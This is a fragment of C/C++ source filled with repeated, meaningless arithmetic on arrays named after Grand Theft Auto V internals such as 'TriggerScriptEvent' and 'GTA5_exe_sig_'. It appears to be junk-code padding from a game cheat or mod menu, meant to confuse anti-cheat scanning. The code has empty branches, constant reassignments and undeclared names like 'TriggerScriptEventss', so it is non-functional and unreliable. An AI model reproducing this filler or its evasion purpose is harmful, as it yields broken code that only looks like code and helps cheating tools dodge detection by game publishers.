			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<FrozenPos>true</FrozenPos>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
